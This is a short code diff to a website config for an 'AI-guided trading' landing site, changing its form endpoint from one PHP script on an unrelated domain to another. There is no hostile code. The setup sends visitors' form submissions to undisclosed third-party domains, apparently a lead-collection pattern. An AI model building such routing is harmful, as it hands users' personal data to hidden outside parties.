@@ -6,7 +6,7 @@ export const SITE = {
   url: 'https://reinefondange-ai.com/',
   email: 'support@reinefondange-ai.com',
   offerName: 'ReineFondangeAI-Site',
-  formEndpoint: 'https://apexai-experts.com/homeMailAction.php',
+  formEndpoint: 'https://meridianc-au.com/webactive-gb.php',
   tagline: 'AI-guided trading with royal composure',
 };
 
